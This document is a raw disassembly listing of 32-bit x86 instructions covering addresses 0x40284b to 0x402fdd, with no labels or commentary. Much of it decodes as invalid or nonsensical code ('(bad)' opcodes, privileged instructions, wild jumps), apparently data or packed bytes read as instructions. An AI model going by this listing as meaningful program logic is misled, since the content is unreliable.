  40284b:	inc    ebp
  40284c:	sbb    BYTE PTR [ebp-0x761326ab],cl
  402852:	in     al,dx
  402853:	xchg   esp,eax
  402854:	push   esi
  402855:	shl    al,0x66
  402858:	add    DWORD PTR [ebp+0x1],0x38df008d
  40285f:	mov    DWORD PTR [edi],ecx
  402861:	cwde   
  402862:	or     cl,BYTE PTR [ecx-0x767a6600]
  402868:	setl   BYTE PTR [edx]
  40286b:	inc    ebp
  40286c:	add    BYTE PTR [edi],cl
  40286e:	test   DWORD PTR [ebp+0xf],ecx
  402871:	xor    edi,edx
  402873:	add    eax,DWORD PTR [eax]
  402875:	xor    ecx,DWORD PTR [ebx+0x458866]
  40287b:	mov    eax,DWORD PTR [ebp-0x1848f010]
  402881:	test   al,0x0
  402883:	mov    BYTE PTR [ebx+0xc18cc3],0x89
  40288a:	adc    BYTE PTR [eax-0x76ff3f7c],ch
  402890:	add    BYTE PTR [eax-0x57f076aa],ch
  402896:	rol    DWORD PTR [ebp+0x0],1
  402899:	mov    ecx,DWORD PTR [ebx+0x758cf0]
  40289f:	inc    DWORD PTR [ebx-0x748a0fe8]
  4028a5:	jmp    FWORD PTR [ebx]
  4028a7:	adc    BYTE PTR [ebx],al
  4028a9:	jne    0x4028ba
  4028ab:	call   DWORD PTR [eax-0x14]
  4028ae:	mov    DWORD PTR [ecx+0x1b7ffe4],eax
  4028b4:	push   cs
  4028b5:	sbb    al,0xca
  4028b7:	inc    ebp
  4028b8:	test   BYTE PTR [ebx-0x47ffe400],cl
  4028be:	dec    eax
  4028bf:	add    DWORD PTR [ebx+0x0],edx
  4028c2:	dec    ebp
  4028c3:	inc    ebp
  4028c4:	mov    esi,0x7f8cff8b
  4028c9:	add    BYTE PTR [ebp-0x74728b75],al
  4028cf:	add    al,0x83
  4028d1:	adc    esp,esi
  4028d3:	(bad)  
  4028d4:	and    edx,DWORD PTR ds:0x780f0703
  4028da:	jp     0x402867
  4028dc:	sysret 
  4028de:	pop    edx
  4028df:	add    eax,DWORD PTR [ebx]
  4028e1:	cmp    esi,DWORD PTR [ebx+esi*2-0x73]
  4028e5:	sub    edx,DWORD PTR [ebx+eax*1]
  4028e8:	dec    ebp
  4028e9:	mov    DWORD PTR [ebp-0x74a48ba1],eax
  4028ef:	ret    0x83
  4028f2:	clc    
  4028f3:	mov    esp,DWORD PTR [ebx]
  4028f5:	add    DWORD PTR [ebx],0x1c
  4028f8:	jnp    0x904fb477
  4028fe:	pop    ecx
  4028ff:	add    BYTE PTR [ebx],al
  402901:	xor    DWORD PTR [eax+eax*1-0x73],0xffffff84
  402906:	adc    al,0x1
  402908:	jge    0x40290a
  40290a:	mov    edx,edx
  40290c:	cld    
  40290d:	test   BYTE PTR [edi],bh
  40290f:	add    edi,edi
  402911:	add    BYTE PTR [esi],al
  402913:	neg    BYTE PTR [ebp-0x7c]
  402916:	add    DWORD PTR [eax],eax
  402918:	pop    es
  402919:	add    BYTE PTR [edi-0x48fff17a],dh
  40291f:	add    BYTE PTR [eax+eax*8],cl
  402922:	inc    ebp
  402923:	test   BYTE PTR [ebx+0x300fc00],al
  402929:	mov    esi,0xf80039
  40292e:	fisttp DWORD PTR [edi]
  402930:	mov    bh,0xda
  402932:	push   cs
  402933:	add    BYTE PTR [edi+0x4d340c39],dh
  402939:	test   bh,bh
  40293b:	add    ah,dh
  40293d:	add    cl,al
  40293f:	mov    cl,0x3
  402941:	add    DWORD PTR [ecx+0x7d65ec00],ecx
  402947:	add    BYTE PTR [edx-0x36],dh
  40294a:	mov    ecx,DWORD PTR [esi]
  40294c:	call   0xef7e113
  402951:	or     al,0xb7
  402953:	dec    ebp
  402954:	or     al,0xf
  402956:	inc    ebp
  402957:	dec    eax
  402958:	add    DWORD PTR [ebx],0x8
  40295b:	(bad)  
  40295d:	scas   al,BYTE PTR es:[edi]
  40295e:	dec    ebp
  40295f:	add    BYTE PTR [ecx],bh
  402961:	(bad)  
  402962:	lock adc al,0x82
  402965:	mov    edi,edi
  402967:	call   0xff9c296b
  40296c:	rcl    BYTE PTR [edi-0x15],0x31
  402970:	xor    edi,DWORD PTR [edi+0x5e]
  402973:	adc    ebx,eax
  402975:	mov    eax,DWORD PTR gs:[eax]
  402978:	mov    edx,esi
  40297a:	nop
  40297b:	rol    BYTE PTR [eax],1
  40297d:	mov    bh,0x83
  40297f:	push   cs
  402980:	or     al,0xb7
  402982:	xor    ecx,DWORD PTR [esi+edx*2]
  402985:	sti    
  402986:	cmp    DWORD PTR [ecx+0xf],ebp
  402989:	dec    edx
  40298a:	test   DWORD PTR [ecx+0x318bec00],ecx
  402990:	or     al,0x41
  402992:	ret    
  402993:	or     DWORD PTR [esi+0x65],edi
  402996:	pop    eax
  402997:	add    BYTE PTR [ebp-0x32],dh
  40299a:	xor    ecx,eax
  40299c:	inc    eax
  40299d:	mov    bh,0x76
  40299f:	push   cs
  4029a0:	inc    eax
  4029a1:	mov    bh,0x3
  4029a3:	or     al,0x8
  4029a5:	sti    
  4029a6:	dec    eax
  4029a7:	sub    ecx,DWORD PTR [ebx+0x70892479]
  4029ad:	cld    
  4029ae:	mov    edi,DWORD PTR [ebp+0x18]
  4029b1:	mov    ecx,DWORD PTR [ebp-0x7b]
  4029b4:	add    esi,DWORD PTR [eax+ecx*1-0x75]
  4029b8:	jne    0x40299e
  4029ba:	cmp    ebx,DWORD PTR [edi+esi*2]
  4029bd:	jns    0xff50263c
  4029c3:	pop    ecx
  4029c4:	jge    0x4029c5
  4029c6:	cmp    eax,edi
  4029c8:	cld    
  4029c9:	inc    ebp
  4029ca:	iret   
  4029cb:	or     BYTE PTR [eax-0x5],bh
  4029ce:	jae    0x402a4d
  4029d0:	(bad)  
  4029d2:	xor    al,0xf
  4029d4:	jmp    0x402a50
  4029d6:	mov    ecx,DWORD PTR [edi]
  4029d8:	lea    ebx,[edx-0x4f]
  4029db:	mov    esi,DWORD PTR [ebx]
  4029dd:	in     al,dx
  4029de:	test   BYTE PTR [ebp+0x27],0x83
  4029e2:	jge    0x4029ec
  4029e4:	add    edi,ebx
  4029e6:	mov    DWORD PTR [ebp-0x8],ecx
  4029e9:	cmp    eax,edi
  4029eb:	hlt    
  4029ec:	adc    ah,BYTE PTR [eax+0xf8b4d7d]
  4029f2:	jl     0x402a44
  4029f4:	clc    
  4029f5:	(bad)  
  4029f7:	js     0x402984
  4029f9:	push   DWORD PTR [edx-0x10]
  4029fc:	mov    eax,ecx
  4029fe:	clc    
  4029ff:	add    edi,edi
  402a01:	mov    DWORD PTR [eax],edx
  402a03:	call   0xfbd7f43
  402a08:	inc    edi
  402a09:	popa   
  402a0a:	jge    0x402a0b
  402a0c:	cmp    ebx,DWORD PTR [edi-0x4]
  402a0f:	xor    edi,DWORD PTR [edx-0x3ffd78c0]
  402a15:	rcr    BYTE PTR [esi-0x37],0xc9
  402a19:	push   ebp
  402a1a:	or     ah,ch
  402a1c:	push   ebp
  402a1d:	sub    ah,0x1
  402a20:	in     al,dx
  402a21:	add    BYTE PTR [edx-0x7ac7a14],bh
  402a27:	fist   DWORD PTR [ebp+0x57]
  402a2a:	(bad)  
  402a2b:	sbb    al,bh
  402a2d:	test   BYTE PTR [ebp+0x4500f800],al
  402a33:	inc    ebp
  402a34:	mov    edi,DWORD PTR [ebx]
  402a36:	cld    
  402a37:	je     0x402a86
  402a39:	cmp    DWORD PTR [ebx+0x4d05fc78],ecx
  402a3f:	ror    BYTE PTR [ebx-0x74740315],0x78
  402a46:	adc    BYTE PTR [ebp-0x42],al
  402a49:	mov    ecx,DWORD PTR [eax]
  402a4b:	sbb    al,0x7
  402a4d:	push   eax
  402a4e:	inc    ebp
  402a4f:	mov    ecx,DWORD PTR [esi-0x7487adec]
  402a55:	add    edi,esp
  402a57:	or     BYTE PTR [ebx+0x890155],bl
  402a5d:	cld    
  402a5e:	mov    edi,0x372f7
  402a63:	jge    0x402a33
  402a65:	xor    eax,esi
  402a67:	mov    edi,eax
  402a69:	hlt    
  402a6a:	iret   
  402a6b:	pop    ebp
  402a6c:	inc    ebp
  402a6d:	jbe    0x402aaa
  402a6f:	cmp    ecx,DWORD PTR [edi]
  402a71:	adc    al,0x7b
  402a73:	push   es
  402a74:	add    BYTE PTR [edi+0x2fc7a8b],dh
  402a7a:	dec    ebp
  402a7b:	div    DWORD PTR [ebx]
  402a7d:	sbb    al,0x3
  402a7f:	mov    edi,DWORD PTR [ebx]
  402a81:	test   DWORD PTR [edi],ecx
  402a83:	je     0x402aee
  402a85:	mov    eax,DWORD PTR [eax]
  402a87:	or     BYTE PTR [ebx-0x76820302],cl
  402a8d:	cmp    eax,DWORD PTR [eax]
  402a8f:	jbe    0x402a91
  402a91:	mov    ebx,esi
  402a93:	or     al,0xdf
  402a95:	jg     0x402a62
  402a97:	add    eax,DWORD PTR [ecx+edi*1-0x1ff07fe]
  402a9e:	dec    ebp
  402a9f:	add    ecx,DWORD PTR [ecx-0x257a2b83]
  402aa5:	je     0x402a85
  402aa7:	mov    edi,ebx
  402aa9:	mov    ebx,DWORD PTR [ebp-0xc]
  402aac:	mov    ecx,DWORD PTR [ecx+0x7ddaf4f0]
  402ab2:	adc    dh,BYTE PTR [edx+0x55]
  402ab5:	jmp    0x402a42
  402ab7:	xor    edi,esp
  402ab9:	pop    edi
  402aba:	rcr    BYTE PTR [ebx+0x33],cl
  402abd:	ret    0x3
  402ac0:	cmp    DWORD PTR [ebx+0x2c17830a],ecx
  402ac6:	push   ebp
  402ac7:	cmp    BYTE PTR [ebx-0x2d760364],cl
  402acd:	cld    
  402ace:	xor    eax,DWORD PTR [ebp+0x3]
  402ad1:	cmp    edi,DWORD PTR [ecx]
  402ad3:	pushf  
  402ad4:	or     cl,BYTE PTR [ebx+0x4d02fc0f]
  402ada:	add    BYTE PTR [ebx+0x4dfcfc8b],cl
  402ae0:	pop    ebp
  402ae1:	mov    ecx,DWORD PTR [ebx-0x3fb20f04]
  402ae7:	push   ebx
  402ae8:	add    ebx,DWORD PTR [ebp-0x75]
  402aeb:	push   esi
  402aec:	adc    BYTE PTR [ecx+0x4d],bl
  402aef:	push   ecx
  402af0:	xor    eax,edi
  402af2:	mov    eax,esi
  402af4:	in     al,0xeb
  402af6:	dec    ebp
  402af7:	add    ecx,DWORD PTR [ebx-0x317403b3]
  402afd:	nop
  402afe:	iret   
  402aff:	add    dh,dl
  402b01:	push   edi
  402b02:	dec    ebp
  402b03:	lahf   
  402b04:	mov    esi,DWORD PTR [edx]
  402b06:	add    esi,DWORD PTR [ebx]
  402b08:	add    esi,DWORD PTR [ebx]
  402b0a:	cmp    eax,DWORD PTR [ebx]
  402b0c:	je     0x402b11
  402b0e:	add    ecx,DWORD PTR [ecx+0xb4de808]
  402b14:	mov    eax,DWORD PTR [esp+edi*8+0x4800ce02]
  402b1b:	pop    ebp
  402b1c:	mov    ecx,DWORD PTR [ebx-0x217bf3f8]
  402b22:	lahf   
  402b23:	fbstp  TBYTE PTR [edx]
  402b25:	(bad)  [ecx+0x45020c84]
  402b2b:	add    BYTE PTR [edi],bh
  402b2d:	pop    ebp
  402b2e:	pushf  
  402b2f:	mov    ecx,DWORD PTR [ebx+0x75001080]
  402b35:	xor    ecx,DWORD PTR [ebx+0x3bd803]
  402b3b:	ud0    ecx,DWORD PTR [edi-0x75]
  402b3f:	add    ah,bh
  402b41:	add    ecx,esi
  402b43:	or     bh,cl
  402b45:	dec    ebp
  402b46:	inc    ebp
  402b47:	mov    edi,DWORD PTR [ebx]
  402b49:	xor    esi,DWORD PTR [ebp+0x3]
  402b4c:	mov    ecx,DWORD PTR [ecx+0x5d75f010]
  402b52:	mov    edi,DWORD PTR [ebx]
  402b54:	fdiv   DWORD PTR [eax+eax*1-0x75]
  402b58:	push   eax
  402b5a:	or     al,0x5d
  402b5c:	inc    ebp
  402b5d:	imul   eax,edi,0x14
  402b60:	loopne 0x402b40
  402b62:	sbb    ebx,edi
  402b64:	jg     0x402b82
  402b66:	inc    ebp
  402b67:	jne    0x402b7c
  402b69:	mov    ebx,DWORD PTR [eax+esi*8+0x6bfc5d8b]
  402b70:	(bad)  
  402b71:	adc    al,0xc7
  402b73:	fiadd  WORD PTR [ebp-0x21]
  402b76:	jne    0x402bd4
  402b78:	mov    edx,DWORD PTR [eax]
  402b7a:	clc    
  402b7b:	test   BYTE PTR [ebp+0x2],cl
  402b7e:	xor    eax,DWORD PTR [eax]
  402b80:	xor    eax,DWORD PTR [ebp-0x73]
  402b83:	mov    eax,DWORD PTR [ebx]
  402b85:	cld    
  402b86:	jb     0x402bcd
  402b88:	add    BYTE PTR [ebx+0x45],ch
  402b8b:	adc    al,0x8b
  402b8d:	rcr    eax,0x48
  402b90:	add    BYTE PTR [ebx],al
  402b92:	add    ecx,DWORD PTR [eax]
  402b94:	pmaxub mm1,mm3
  402b97:	dec    ebp
  402b98:	dec    DWORD PTR [ebx+0x5545fc24]
  402b9e:	xor    esi,DWORD PTR [ebx]
  402ba0:	add    eax,DWORD PTR [ebx]
  402ba2:	cmp    esi,DWORD PTR [ebx]
  402ba4:	hlt    
  402ba5:	mov    DWORD PTR [edi],ecx
  402ba7:	fadd   QWORD PTR [ebp+0x8]
  402baa:	xor    edx,edi
  402bac:	add    ebx,edi
  402bae:	cmp    ecx,edx
  402bb0:	clts   
  402bb2:	jp     0x402c01
  402bb4:	dec    DWORD PTR [ecx+0x4dfcdc8b]
  402bba:	(bad)  
  402bbb:	xor    eax,edi
  402bbd:	add    eax,DWORD PTR [ebp+0xc]
  402bc0:	jne    0x402c07
  402bc2:	mov    ecx,DWORD PTR [ebp+0x724d01f8]
  402bc8:	xor    eax,DWORD PTR [eax]
  402bca:	lea    eax,[ebp+0x1]
  402bcd:	(bad)  
  402bce:	jb     0x402ba8
  402bd0:	add    BYTE PTR [ebp+0x45e9f845],al
  402bd6:	add    bh,bh
  402bd8:	add    BYTE PTR [eax*2+0x12018080],cl
  402bdf:	add    bh,al
  402be1:	adc    BYTE PTR [ecx*2+0x30e332d],cl
  402be8:	pop    ebp
  402be9:	mov    DWORD PTR [ebx],esi
  402beb:	hlt    
  402bec:	add    ecx,eax
  402bee:	jmp    0x852c05
  402bf3:	inc    DWORD PTR [ebp+0xc]
  402bf6:	xor    eax,DWORD PTR [eax+0x890103]
  402bfc:	in     al,dx
  402bfd:	push   eax
  402bfe:	inc    ebp
  402bff:	mov    DWORD PTR [ebx],esi
  402c01:	hlt    
  402c02:	add    eax,DWORD PTR [ebp-0x77]
  402c05:	or     DWORD PTR [esi+eiz*2],0x4d
  402c09:	(bad)  
  402c0a:	mov    esp,eax
  402c0c:	fcomp  QWORD PTR [ecx+0x45cff8ce]
  402c12:	enter  0x633,0x3
  402c16:	add    al,0x3b
  402c18:	mov    esp,esi
  402c1a:	in     al,dx
  402c1b:	and    eax,DWORD PTR [ebp+0x45]
  402c1e:	mov    ecx,DWORD PTR [ebx-0x39ba1f68]
  402c24:	mov    ecx,esi
  402c26:	cld    
  402c27:	pushf  
  402c28:	dec    ebp
  402c29:	lahf   
  402c2a:	xor    esi,DWORD PTR [edx]
  402c2c:	add    ecx,DWORD PTR [ebx-0x7f8befc5]
  402c32:	mov    eax,DWORD PTR [ecx]
  402c34:	cld    
  402c35:	add    BYTE PTR [ebp-0x31],cl
  402c38:	xor    ebp,DWORD PTR [edi+0x50c15103]
  402c3e:	pop    ds
  402c3f:	mov    eax,ecx
  402c41:	cld    
  402c42:	sbb    dh,al
  402c44:	dec    ebp
  402c45:	(bad)  
  402c46:	mov    eax,DWORD PTR [ebp+0x10]
  402c49:	jne    0x402bcb
  402c4b:	mov    eax,DWORD PTR [ecx]
  402c4d:	fadd   DWORD PTR [eax]
  402c4f:	(bad)  
  402c50:	mov    bh,0xc7
  402c52:	push   ecx
  402c53:	fdiv   DWORD PTR [ebp-0x7a]
  402c56:	(bad)  
  402c57:	dec    DWORD PTR [eax]
  402c59:	call   FWORD PTR [ecx]
  402c5b:	inc    ebp
  402c5c:	inc    ebp
  402c5d:	xor    eax,DWORD PTR [ebx]
  402c5f:	add    ecx,DWORD PTR [eax]
  402c61:	cmp    ecx,DWORD PTR [ebp-0xc]
  402c64:	mov    edx,DWORD PTR [edi]
  402c66:	fadd   DWORD PTR [ebp+0x0]
  402c69:	mov    eax,DWORD PTR [ebx-0x39fd18]
  402c6f:	test   ah,dh
  402c71:	lahf   
  402c72:	push   ecx
  402c73:	xor    cl,BYTE PTR [ecx+0x45e80c89]
  402c79:	out    dx,eax
  402c7a:	mov    eax,DWORD PTR [eax]
  402c7c:	or     al,0xc7
  402c7e:	(bad)  
  402c7f:	in     al,dx
  402c80:	(bad)  
  402c81:	sbb    eax,ecx
  402c83:	add    DWORD PTR [ebp+0x45],eax
  402c86:	jne    0x402c16
  402c88:	mov    eax,DWORD PTR [eax+ebp*8]
  402c8b:	mov    eax,esi
  402c8d:	cld    
  402c8e:	test   dh,bl
  402c90:	lahf   
  402c91:	fbstp  TBYTE PTR [edx]
  402c93:	ret    0x89
  402c96:	call   0x4e3c3d26
  402c9b:	(bad)  
  402c9c:	xor    eax,edi
  402c9e:	add    eax,DWORD PTR [ebp+0xf]
  402ca1:	mov    eax,ecx
  402ca3:	cld    
  402ca4:	dec    ebp
  402ca5:	(bad)  
  402ca6:	mov    edi,eax
  402ca8:	cdq    
  402ca9:	inc    ebp
  402caa:	inc    ebp
  402cab:	mov    esi,DWORD PTR [ebx]
  402cad:	cld    
  402cae:	lea    eax,[ebp+0x3]
  402cb1:	xor    esi,DWORD PTR [edx+0x3]
  402cb4:	add    BYTE PTR [ebx],bh
  402cb6:	inc    ebp
  402cb7:	je     0x402c44
  402cb9:	mov    esp,esp
  402cbb:	cwde   
  402cbc:	mov    BYTE PTR [ebp-0x39],0x8b
  402cc0:	add    al,0xe4
  402cc2:	(bad)  
  402cc4:	sub    ecx,DWORD PTR [ecx+0x458b0cff]
  402cca:	lock mov eax,DWORD PTR [ebp-0x14]
  402cce:	mov    eax,esi
  402cd0:	aam    0xc7
  402cd2:	jmp    0xd645:0x2972c1
  402cd9:	mov    eax,ebp
  402cdb:	in     al,dx
  402cdc:	inc    esi
  402cde:	mov    eax,edi
  402ce0:	cld    
  402ce1:	jmp    0x750f68b4
  402ce6:	ror    DWORD PTR [ebx+0x4575ec45],0x8b
  402ced:	mov    edi,eax
  402cef:	fadd   DWORD PTR [ebx]
  402cf1:	add    BYTE PTR [ebp+0xf],al
  402cf4:	xor    ecx,ecx
  402cf6:	add    edi,edi
  402cf8:	pop    edi
  402cf9:	hlt    
  402cfa:	pop    ebx
  402cfb:	push   eax
  402cfc:	ret    0xeb
  402cff:	mov    ecx,DWORD PTR [ebx+0x2845830c]
  402d05:	mov    eax,DWORD PTR [ebp+0x10]
  402d08:	cmp    BYTE PTR [ecx+0xc7019c],cl
  402d0e:	fadd   st,st(0)
  402d10:	test   DWORD PTR [eax-0x8],edx
  402d13:	jne    0x402d5a
  402d15:	dec    DWORD PTR [ecx+0x45450c08]
  402d1b:	mov    edi,DWORD PTR [ecx+0x74d08fc]
  402d21:	xor    eax,ecx
  402d23:	add    ebx,DWORD PTR [edi+0x568b323b]
  402d29:	clc    
  402d2a:	jne    0x402d3d
  402d2c:	add    ecx,DWORD PTR [ebp+0x3b]
  402d2f:	xor    ecx,DWORD PTR [edi]
  402d31:	lea    esp,[ecx]
  402d33:	add    DWORD PTR [eax],eax
  402d35:	jb     0x402cc2
  402d37:	add    BYTE PTR [eax],cl
  402d39:	inc    ebp
  402d3a:	jne    0x402d27
  402d3c:	add    ecx,DWORD PTR [ebx-0x3976f3c4]
  402d42:	or     al,0xc7
  402d44:	inc    ebp
  402d45:	scas   eax,DWORD PTR es:[edi]
  402d46:	aas    
  402d47:	mov    ebx,DWORD PTR [esp+eiz*8-0x741bfb75]
  402d4e:	jne    0x402d48
  402d50:	mov    eax,esi
  402d52:	or     al,0x9c
  402d54:	icebp  
  402d55:	lahf   
  402d56:	shl    DWORD PTR [edx],0xf2
  402d59:	mov    esi,DWORD PTR [esp+edi*8+0x33934d70]
  402d60:	lsl    ebp,bx
  402d63:	cmp    DWORD PTR [eax],eax
  402d65:	cdq    
  402d66:	mov    eax,DWORD PTR [ebp-0xba00f4]
  402d6c:	add    edx,DWORD PTR [ebp-0x60]
  402d6f:	mov    eax,DWORD PTR [eax]
  402d71:	call   0x81487b01
  402d76:	jge    0x402d16
  402d78:	sub    esi,DWORD PTR [edx]
  402d7a:	xor    al,0x33
  402d7c:	jge    0x402d67
  402d7e:	xor    edi,ebp
  402d80:	add    edi,edi
  402d82:	mov    DWORD PTR [ebp-0x24],ecx
  402d85:	xor    esi,edi
  402d87:	add    eax,DWORD PTR [ebx+edi*1-0x3ff7500]
  402d8e:	jne    0x402d98
  402d90:	xor    eax,DWORD PTR [ebp+0x3]
  402d93:	jmp    0x402d1e
  402d95:	mov    edi,eax
  402d97:	cld    
  402d98:	mov    esi,0x5e85c7f0
  402d9e:	clc    
  402d9f:	leave  
  402da0:	xchg   edi,eax
  402da1:	or     al,0x0
  402da3:	push   ebp
  402da4:	mov    ebp,esp
  402da6:	cld    
  402da7:	in     al,dx
  402da8:	icebp  
  402da9:	(bad)  
  402daa:	jnp    0x402da8
  402dac:	add    eax,DWORD PTR [ebp+0x453bf8d1]
  402db2:	jae    0x402def
  402db4:	sub    ebx,DWORD PTR [ebp+ecx*4-0x76f38f75]
  402dbb:	inc    ebp
  402dbc:	call   0x823ce54c
  402dc1:	pop    ecx
  402dc2:	call   DWORD PTR [ecx+0x0]
  402dc5:	xor    ecx,DWORD PTR [ecx+0x7d72ecba]
  402dcb:	add    BYTE PTR [ebx+0x3082b8b],cl
  402dd1:	ret    0xf00f
  402dd4:	xor    eax,DWORD PTR [esi+ebp*8-0x76ffccff]
  402ddb:	inc    ebp
  402ddc:	loopne 0x402d69
  402dde:	jne    0x402de8
  402de0:	mov    esi,DWORD PTR [eax-0x20]
  402de3:	push   edi
  402de4:	jge    0x402e5b
  402de6:	xor    eax,edi
  402de8:	(bad)  
  402de9:	in     al,0x3e
  402deb:	test   DWORD PTR [edx-0x8],esi
  402dee:	add    BYTE PTR [ebp+0x75],al
  402df1:	mov    ecx,DWORD PTR [ebx+0x7d7df0fc]
  402df7:	xor    esi,DWORD PTR [ebx]
  402df9:	xor    eax,DWORD PTR [ebx]
  402dfb:	add    edi,DWORD PTR [ebx]
  402dfd:	cmp    DWORD PTR [ebp-0x39],esi
  402e00:	mov    edx,DWORD PTR [ebp-0x7b82fe10]
  402e06:	xor    eax,DWORD PTR [eax]
  402e08:	add    eax,DWORD PTR [eax]
  402e0a:	cmp    esi,DWORD PTR [ebp+0x75]
  402e0d:	mov    ecx,DWORD PTR [ebx+0x7d86e008]
  402e13:	add    BYTE PTR [ecx],al
  402e15:	add    BYTE PTR [ebx+0x4d8b0275],al
  402e1b:	or     al,0x75
  402e1d:	ja     0x402daa
  402e1f:	mov    esi,esp
  402e21:	cld    
  402e22:	pop    ebp
  402e23:	stc    
  402e24:	mov    edi,edx
  402e26:	in     al,0x75
  402e28:	jge    0x402e65
  402e2a:	mov    ecx,DWORD PTR [edi]
  402e2c:	or     al,0xc4
  402e2e:	icebp  
  402e2f:	add    BYTE PTR [ebx+ecx*4-0xe6c038c],bh
  402e36:	jae    0x402e2a
  402e38:	add    esi,DWORD PTR [ebp-0xc]
  402e3b:	push   ebx
  402e3c:	jne    0x402e83
  402e3e:	mov    edi,DWORD PTR ds:0xe9f19c04
  402e44:	repnz add BYTE PTR [ebp+0x0],bl
  402e48:	cmp    esi,DWORD PTR [ebp+0xf]
  402e4b:	xor    edx,DWORD PTR [ebp+ecx*4-0x1]
  402e4f:	clc    
  402e50:	pop    ebx
  402e51:	repnz inc ebp
  402e53:	out    dx,eax
  402e54:	pop    edi
  402e55:	test   DWORD PTR [ebx],0x33fe456d
  402e5b:	pop    esp
  402e5c:	add    ecx,DWORD PTR [eax]
  402e5e:	pop    esi
  402e5f:	jge    0x402e23
  402e61:	(bad)  
  402e63:	xor    ecx,DWORD PTR [ebx+0x540f83e6]
  402e69:	add    BYTE PTR [ebp+0x75],al
  402e6c:	cmp    BYTE PTR [ebx+0x30c7ec9c],cl
  402e72:	fdivr  st(2),st
  402e74:	test   esi,edi
  402e76:	clc    
  402e77:	mov    bh,0x45
  402e79:	rcl    DWORD PTR [ebx+0xc],0xbe
  402e7d:	stc    
  402e7e:	or     BYTE PTR [ebp+0x7],bh
  402e81:	mov    esi,eax
  402e83:	in     al,dx
  402e84:	lahf   
  402e85:	jne    0x402eb9
  402e87:	mov    eax,DWORD PTR [ebx]
  402e89:	or     BYTE PTR [ecx+0x45b4e8f1],cl
  402e8f:	lahf   
  402e90:	xor    esi,DWORD PTR [edx]
  402e92:	add    ecx,DWORD PTR [ecx+0x75e0e089]
  402e98:	mov    ecx,DWORD PTR [ebx-0xeba13e0]
  402e9e:	mov    esi,edx
  402ea0:	lock inc cl
  402ea3:	push   ss
  402ea4:	inc    ebp
  402ea5:	jne    0x402e28
  402ea7:	mov    esi,eax
  402ea9:	in     al,dx
  402eaa:	mov    ch,0xf1
  402eac:	clc    
  402ead:	repnz inc ebp
  402eaf:	dec    BYTE PTR [ebx-0x3e8a07f8]
  402eb5:	mov    eax,DWORD PTR [ebp-0x24]
  402eb8:	cmp    DWORD PTR [esi],0xff85c3f8
  402ebe:	clc    
  402ebf:	call   0x5dcbce09
  402ec4:	hlt    
  402ec5:	add    ecx,eax
  402ec7:	clc    
  402ec8:	inc    ebp
  402ec9:	jne    0x402e4c
  402ecb:	mov    esi,esp
  402ecd:	clc    
  402ece:	test   DWORD PTR [ebp-0x8],ebx
  402ed1:	xor    eax,DWORD PTR [ebp+0x3b]
  402ed4:	mov    esi,ebx
  402ed6:	in     al,dx
  402ed7:	xchg   ebp,eax
  402ed8:	rol    DWORD PTR [ecx],0x45
  402edb:	sbb    BYTE PTR [ecx+0x58bec45],al
  402ee1:	cld    
  402ee2:	clc    
  402ee3:	pop    eax
  402ee4:	add    BYTE PTR [ebx],dh
  402ee6:	add    BYTE PTR [ebx],al
  402ee8:	mov    WORD PTR [ebp-0xc],ax
  402eec:	mov    ebx,esi
  402eee:	or     BYTE PTR [ebp-0x7b0040],al
  402ef4:	add    ecx,DWORD PTR [ebx-0x14ba2800]
  402efa:	test   DWORD PTR [ebx-0x3e2b03f1],ecx
  402f00:	add    dl,al
  402f02:	mov    ecx,ecx
  402f04:	sbb    BYTE PTR [eax],cl
  402f06:	rcl    BYTE PTR [ebp-0x7c],0xec
  402f0a:	add    ebp,esp
  402f0c:	add    bh,al
  402f0e:	mov    edi,esp
  402f10:	and    BYTE PTR [ebp+0x4500f843],al
  402f16:	cmp    ax,cx
  402f19:	pushf  
  402f1a:	or     cl,BYTE PTR [ebx+0x5666fc00]
  402f20:	rcr    DWORD PTR [ecx+0x4d],0x51
  402f24:	xor    ax,WORD PTR [ecx]
  402f27:	mov    ebx,0x37285
  402f2c:	add    bl,al
  402f2e:	inc    ebp
  402f2f:	inc    ebp
  402f30:	mov    ecx,DWORD PTR [ebx-0x39ba03f8]
  402f36:	add    eax,ebx
  402f38:	cmp    al,0x45
  402f3a:	inc    ebp
  402f3b:	push   edi
  402f3c:	mov    edi,DWORD PTR [ebp+0x50]
  402f3f:	mov    eax,eax
  402f41:	lock test BYTE PTR [ebp+0x3],cl
  402f45:	xor    eax,DWORD PTR [eax]
  402f47:	mov    DWORD PTR [ebp-0x10],eax
  402f4a:	cmp    BYTE PTR [ebp-0x74],al
  402f4d:	cmp    BYTE PTR [ebx-0x39742b64],cl
  402f53:	clc    
  402f54:	ret    
  402f55:	dec    ebp
  402f56:	inc    ebp
  402f57:	xor    ecx,DWORD PTR [ebx-0x78070377]
  402f5d:	inc    ebp
  402f5e:	add    eax,edi
  402f60:	add    BYTE PTR [eax+ecx*1+0x3f4498b],bl
  402f67:	dec    ebp
  402f68:	mov    esi,DWORD PTR [ebx]
  402f6a:	cld    
  402f6b:	mov    DWORD PTR [edi+0x4501f4],eax
  402f71:	cmp    al,0x10
  402f73:	pushf  
  402f74:	dec    ebp
  402f75:	mov    ecx,DWORD PTR [ecx-0x2db2df14]
  402f7b:	xor    esi,DWORD PTR [ebx]
  402f7d:	mov    DWORD PTR [edi+0x4501ec],eax
  402f83:	cmp    BYTE PTR [ebp-0x61],dl
  402f86:	push   edx
  402f87:	mov    eax,0x339555
  402f8c:	add    ecx,DWORD PTR [ecx+0x45712052]
  402f92:	inc    DWORD PTR [ebp-0x20aff0e0]
  402f98:	mov    eax,DWORD PTR [eax]
  402f9a:	in     al,0x8b
  402f9c:	inc    ecx
  402f9d:	or     al,0x8b
  402f9f:	rcl    BYTE PTR [eax-0x7c],0xc8
  402fa3:	add    eax,DWORD PTR [ebp+0x0]
  402fa6:	push   ecx
  402fa7:	inc    ebp
  402fa8:	call   0x4f3932
  402fad:	leave  
  402fae:	push   ebp
  402faf:	add    BYTE PTR [ebx+0x459466],cl
  402fb5:	mov    ecx,0x8b8a89
  402fba:	or     al,0x33
  402fbc:	jo     0x402f77
  402fbe:	(bad)  
  402fbf:	cmp    ecx,DWORD PTR [eax]
  402fc1:	add    al,ch
  402fc3:	add    eax,DWORD PTR [edi]
  402fc5:	mov    eax,DWORD PTR [eax]
  402fc7:	or     BYTE PTR [ebp+0x39],cl
  402fca:	mov    ecx,DWORD PTR [edi]
  402fcc:	cmp    al,0xa9
  402fce:	rol    DWORD PTR [eax],0xb7
  402fd1:	mov    edx,DWORD PTR [esp+edi*8]
  402fd4:	dec    esp
  402fd5:	dec    ebp
  402fd6:	sbb    BYTE PTR [ebx+0x418b084d],cl
  402fdc:	cld    
  402fdd:	mov    DWORD PTR [edi-0x31bff9f4],esi
